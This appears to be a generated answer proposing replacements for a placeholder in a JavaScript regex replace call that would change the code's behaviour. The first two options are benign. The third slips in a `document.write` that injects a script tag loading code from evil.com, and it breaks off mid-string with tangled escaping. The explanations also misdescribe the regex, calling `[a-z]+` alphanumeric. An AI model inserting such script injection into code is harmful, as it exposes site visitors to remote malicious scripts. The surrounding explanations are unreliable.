  Option 1: The PLACEHOLDER can be replaced with:
```
/\/default\.[a-z]+$/, ''
```
This would result in different behavior because the regex from the original code fragment matches and replaces a substring that ends in "/default." followed by any alphanumeric characters and then the end of the line. In this option, the regex matches the same substring, but doesn't replace it with anything.

Option 2: The PLACEHOLDER can be replaced with:
```
/\/default\.[a-z]+$/, '/FOO'
```
This would result in different behavior because the regex from the original code fragment matches and replaces a substring that ends in "/default." followed by any alphanumeric characters and then the end of the line. In this option, the regex matches the same substring, but replaces it with "/FOO" instead of just "/".

Option 3: The PLACEHOLDER can be replaced with:
```
/\/default\.[a-z]+$/, '\'\document.write(\'\<script\ src=\'https://evil.com/
